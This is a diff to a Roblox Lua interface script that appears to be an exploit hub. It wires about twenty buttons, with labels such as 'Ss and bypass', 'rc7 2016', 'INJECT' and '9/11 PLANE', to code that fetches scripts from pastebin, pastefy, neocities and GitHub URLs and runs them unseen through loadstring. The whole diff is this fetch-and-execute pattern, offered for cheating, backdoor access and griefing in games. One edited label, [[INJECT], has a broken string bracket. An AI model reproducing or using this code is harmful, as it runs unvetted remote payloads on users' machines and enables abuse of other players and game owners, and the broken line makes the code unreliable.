@@ -90,6 +90,22 @@ LMG2L["TextButton2_8"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_8"]["Text"] = [[ssp]];
 LMG2L["TextButton2_8"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_8"]["Position"] = UDim2.new(0, 8, 0, 44);
+LMG2L["TextButton2_8"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastebin.com/raw/DV1v0xnt")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -102,6 +118,22 @@ LMG2L["TextButton2_9"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_9"]["Text"] = [[Ss and bypass]];
 LMG2L["TextButton2_9"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_9"]["Position"] = UDim2.new(0, 106, 0, 44);
+LMG2L["TextButton2_9"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastebin.com/raw/rLZTaE8s")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -114,6 +146,22 @@ LMG2L["TextButton2_a"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_a"]["Text"] = [[SEGMA V4]];
 LMG2L["TextButton2_a"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_a"]["Position"] = UDim2.new(0, 8, 0, 74);
+LMG2L["TextButton2_a"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/a2VxTbDs/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -128,6 +176,22 @@ LMG2L["TextButton2_b"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_b"]["Text"] = [[SAMSUNG NOTE]];
 LMG2L["TextButton2_b"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_b"]["Position"] = UDim2.new(0, 106, 0, 74);
+LMG2L["TextButton2_b"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/dA68xt1p/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -142,6 +206,22 @@ LMG2L["TextButton2_c"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_c"]["Text"] = [[1×4 HADX MINI]];
 LMG2L["TextButton2_c"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_c"]["Position"] = UDim2.new(0, 8, 0, 104);
+LMG2L["TextButton2_c"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/4U9m0vuN/raw?part=1x1x1x1x1_hax%20Gui%20mini%20edition")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -156,6 +236,22 @@ LMG2L["TextButton2_d"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_d"]["Text"] = [[PROJECT ZAGA]];
 LMG2L["TextButton2_d"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_d"]["Position"] = UDim2.new(0, 106, 0, 104);
+LMG2L["TextButton2_d"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/QcuBoc7w/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -170,6 +266,22 @@ LMG2L["TextButton2_e"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_e"]["Text"] = [[OUCH SIMSOMP SPAM]];
 LMG2L["TextButton2_e"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_e"]["Position"] = UDim2.new(0, 8, 0, 134);
+LMG2L["TextButton2_e"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/h6fhUC6z/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextLabel
@@ -194,6 +306,22 @@ LMG2L["TextButton2_10"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_10"]["Text"] = [[project eluaria]];
 LMG2L["TextButton2_10"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_10"]["Position"] = UDim2.new(0, 106, 0, 134);
+LMG2L["TextButton2_10"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/TvLHaW8s/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -206,6 +334,22 @@ LMG2L["TextButton2_11"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_11"]["Text"] = [[9/11 PLANE]];
 LMG2L["TextButton2_11"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_11"]["Position"] = UDim2.new(0, 8, 0, 164);
+LMG2L["TextButton2_11"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastebin.com/raw/5saVhNKb")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -218,6 +362,22 @@ LMG2L["TextButton2_12"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_12"]["Text"] = [[rc7 2016]];
 LMG2L["TextButton2_12"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_12"]["Position"] = UDim2.new(0, 106, 0, 164);
+LMG2L["TextButton2_12"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://fromhatai.neocities.org/Private/Rc7.lua")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -232,6 +392,22 @@ LMG2L["TextButton2_13"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_13"]["Text"] = [[rc7 by 00script]];
 LMG2L["TextButton2_13"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_13"]["Position"] = UDim2.new(0, 8, 0, 194);
+LMG2L["TextButton2_13"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/kvsna3545-pixel/Rc7/refs/heads/main/Return_rc7.luau")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -244,6 +420,22 @@ LMG2L["TextButton2_14"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_14"]["Text"] = [[SHIBA OLD]];
 LMG2L["TextButton2_14"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_14"]["Position"] = UDim2.new(0, 106, 0, 194);
+LMG2L["TextButton2_14"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastebin.com/raw/HrE2dKSD")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -258,6 +450,22 @@ LMG2L["TextButton2_15"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_15"]["Text"] = [[PROJECT BALLER]];
 LMG2L["TextButton2_15"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_15"]["Position"] = UDim2.new(0, 8, 0, 224);
+LMG2L["TextButton2_15"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/t6W9lM9x/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -272,6 +480,22 @@ LMG2L["TextButton2_16"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_16"]["Text"] = [[SHELDONI BY Spawn BLOCK v2]];
 LMG2L["TextButton2_16"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_16"]["Position"] = UDim2.new(0, 106, 0, 224);
+LMG2L["TextButton2_16"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastebin.com/raw/PgxctSd6")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -286,6 +510,22 @@ LMG2L["TextButton2_17"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_17"]["Text"] = [[Tco gui style koopgui ]];
 LMG2L["TextButton2_17"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_17"]["Position"] = UDim2.new(0, 8, 0, 254);
+LMG2L["TextButton2_17"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/dWdNO8lL/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -300,6 +540,22 @@ LMG2L["TextButton2_18"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_18"]["Text"] = [[Project STIGMA LUA]];
 LMG2L["TextButton2_18"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_18"]["Position"] = UDim2.new(0, 106, 0, 254);
+LMG2L["TextButton2_18"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Executor-Remakes-In-Lua/refs/heads/main/Remakes/Stigma_Revision_0.lua")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.script Frame.Frame.TextButton2
@@ -312,6 +568,22 @@ LMG2L["TextButton2_19"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton2_19"]["Text"] = [[project secret]];
 LMG2L["TextButton2_19"]["Name"] = [[TextButton2]];
 LMG2L["TextButton2_19"]["Position"] = UDim2.new(0, 8, 0, 284);
+LMG2L["TextButton2_19"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/3FJWjzxE/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.TextLabel4
@@ -345,6 +617,22 @@ LMG2L["TextButton7_1c"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton7_1c"]["Text"] = [[dex]];
 LMG2L["TextButton7_1c"]["Name"] = [[TextButton7]];
 LMG2L["TextButton7_1c"]["Position"] = UDim2.new(0, 632, 0, 4);
+LMG2L["TextButton7_1c"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/realredz/DEX-Explorer/refs/heads/main/Mobile.lua")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.minutesFrame.TextButton2
@@ -369,6 +657,22 @@ LMG2L["TextButton8_1e"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton8_1e"]["Text"] = [[ssp]];
 LMG2L["TextButton8_1e"]["Name"] = [[TextButton8]];
 LMG2L["TextButton8_1e"]["Position"] = UDim2.new(0, 576, 0, 4);
+LMG2L["TextButton8_1e"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://pastefy.app/t2gUwfXy/raw")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.minutesFrame.ScrollingFrame2
@@ -416,6 +720,22 @@ LMG2L["TextButton6_22"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton6_22"]["Text"] = [[R6]];
 LMG2L["TextButton6_22"]["Name"] = [[TextButton6]];
 LMG2L["TextButton6_22"]["Position"] = UDim2.new(0, 682, 0, 4);
+LMG2L["TextButton6_22"].MouseButton1Click:Connect(function()
+    local success, result = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/sigmaballs4141/asd/refs/heads/main/AOIWruw823rpo8n30")
+    end)
+
+    if success then
+        local func, err = loadstring(result)
+        if func then
+            pcall(func)
+        else
+            warn("Loadstring error: "..err)
+        end
+    else
+        warn("HttpGet failed")
+    end
+end)
 
 
 -- Players.giruoh_jgry.PlayerGui.ScreenGui.top.minutesFrame.TextButton5
@@ -425,7 +745,7 @@ LMG2L["TextButton5_23"]["TextSize"] = 10;
 LMG2L["TextButton5_23"]["BackgroundColor3"] = Color3.fromRGB(209, 209, 209);
 LMG2L["TextButton5_23"]["Size"] = UDim2.new(0, 138, 0, 28);
 LMG2L["TextButton5_23"]["BorderColor3"] = Color3.fromRGB(209, 209, 209);
-LMG2L["TextButton5_23"]["Text"] = [[load]];
+LMG2L["TextButton5_23"]["Text"] = [[INJECT];
 LMG2L["TextButton5_23"]["Name"] = [[TextButton5]];
 LMG2L["TextButton5_23"]["Position"] = UDim2.new(0, 6, 0, 364);
 
